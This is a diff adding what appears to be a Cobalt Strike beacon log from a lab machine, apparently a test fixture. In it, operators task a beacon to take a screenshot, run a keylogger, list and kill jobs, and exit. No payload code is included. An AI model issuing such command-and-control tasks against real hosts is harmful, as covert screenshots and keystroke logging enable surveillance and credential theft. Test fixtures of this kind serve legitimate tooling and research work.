@@ -1,0 +1,34 @@
+03/29 13:16:36 UTC [metadata] 13.80.254.1 <- 10.99.1.4; computer: LabMaster; user: outflank *; process: testbeacon.exe; pid: 3324; os: Windows; version: 6.2; beacon arch: x64 (x64)
+03/29 13:26:57 UTC [input] <MarcS> screenshot
+03/29 13:26:57 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+03/29 13:27:01 UTC [checkin] host called home, sent: 197186 bytes
+03/29 13:27:02 UTC [output]
+received screenshot (166469 bytes)
+
+03/29 13:54:31 UTC [input] <neo> keylogger
+03/29 13:54:31 UTC [task] <T1056, T1093> Tasked beacon to log keystrokes
+03/29 13:54:35 UTC [checkin] host called home, sent: 81474 bytes
+03/29 13:55:09 UTC [output]
+received keystrokes
+
+03/29 13:55:18 UTC [output]
+received keystrokes
+
+03/29 13:55:34 UTC [input] <neo> jobkill
+03/29 13:55:34 UTC [error] jobkill error: not enough arguments
+03/29 13:55:36 UTC [input] <neo> jobs
+03/29 13:55:36 UTC [task] <> Tasked beacon to list jobs
+03/29 13:55:37 UTC [checkin] host called home, sent: 8 bytes
+03/29 13:55:37 UTC [output]
+1	0	keystroke logger
+
+
+03/29 13:55:42 UTC [input] <neo> jobkill 1
+03/29 13:55:42 UTC [task] <> Tasked beacon to kill job 1
+03/29 13:55:42 UTC [checkin] host called home, sent: 10 bytes
+03/29 15:01:06 UTC [input] <MarcS> exit
+03/29 15:01:06 UTC [task] <> Tasked beacon to exit
+03/29 15:01:08 UTC [checkin] host called home, sent: 8 bytes
+03/29 15:01:08 UTC [output]
+beacon exit.
+
